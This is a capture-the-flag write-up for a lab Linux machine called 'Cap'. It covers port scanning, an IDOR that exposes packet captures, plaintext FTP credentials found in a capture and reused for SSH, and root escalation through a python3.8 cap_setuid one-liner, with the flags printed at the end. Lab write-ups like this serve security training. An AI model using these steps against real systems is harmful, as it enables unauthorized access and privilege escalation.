# Cap Writeup

> Machine : Linux

>  Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.129.112.58 -p-
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

From our results, we can see ports 21 (FTP), 22 (SSH) and 80 (HTTP) are open.

So first let's try browsing the IP and see. 
After searching we found `http://10.129.112.58/data/3`, here we can download a `.pcap` file and see the network captures. I tried `.../data/1`, `.../data/3`, and `.../data/4`. Each time, the server happily handed over a file. This confirmed the IDOR vulnerability. I could, in fact, access other users captures.

After downloading all the captures. We found `0.pcap` has an `IP` for another user, and there is some `ftp captures`. So after follow the ftp captures we found:

```text
220 (vsFTPd 3.0.3)

USER nathan

331 Please specify the password.

PASS Buck3tH4TF0RM3!

230 Login successful.

SYST

215 UNIX Type: L8

PORT 192,168,196,1,212,140

200 PORT command successful. Consider using PASV.

LIST

150 Here comes the directory listing.
226 Directory send OK.

PORT 192,168,196,1,212,141

200 PORT command successful. Consider using PASV.

LIST -al

150 Here comes the directory listing.
226 Directory send OK.

TYPE I

200 Switching to Binary mode.

PORT 192,168,196,1,212,143

200 PORT command successful. Consider using PASV.

RETR notes.txt

550 Failed to open file.

QUIT

221 Goodbye.
```

And this is it. The `username: nathan` and the `password: Buck3tH4TF0RM3!` are in clear.

These credentials works in `ftp`, but also after trying we found that the credentials are same in `ssh`.

```shell
ssh nathan@10.129.112.58
Buck3tH4TF0RM3!
```

And we are in.

```shell
cat user.txt
```

```text
3d618d6a455ed714f8e1310bb0d10f47
```

> Submit User Flag
> 
> 3d618d6a455ed714f8e1310bb0d10f47

User Flag Captured! The first phase was complete. Now, it was time to find a way to become root.

We can use `LinPeas` to automate the enumeration. But because the name of the machine is `Cap` let's use `getcap` instead which scans the filesystem for binaries that have been granted kernel level privileges that extend beyond standard file permissions.

```shell
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allows a process to manipulate its user ID (UID). In this case, it meant the Python 3.8 binary had the inherent power to become any user on the system. Using `GTFOBins` confirmed the exact command needed to leverage this.

```shell
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'
```

```shell
id
```

```text
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

```shell
cat /root/root.txt
```

```text
c343a884e8a9f66dc819004b9e7d93fc
```

> Submit Root Flag
> 
> c343a884e8a9f66dc819004b9e7d93fc

